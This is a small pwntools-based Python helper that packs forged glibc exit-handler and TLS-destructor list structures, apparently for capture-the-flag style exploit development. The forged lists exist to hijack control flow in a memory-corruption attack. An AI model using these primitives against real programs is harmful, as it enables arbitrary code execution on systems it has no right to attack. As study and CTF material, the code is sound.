from pwnlib.util.packing import p8, p16, p32, p64

def exit_function_list(fns: list[tuple[int, int]], length: int | None = None, next: int | None = None):
    length = length or len(fns)
    data = b""
    data += p64(next or 0)
    data += p64(length - 1)
    for (fn, arg) in fns:
        data += p64(4)
        data += p64(fn)
        data += p64(arg)
        data += p64(0)
    return data

def dtor_list(fn: int, arg: int, next: int | None = None):
    data = b""
    data += p64(fn)
    data += p64(arg)
    data += p64(0) # link map
    data += p64(next or 0)
    return data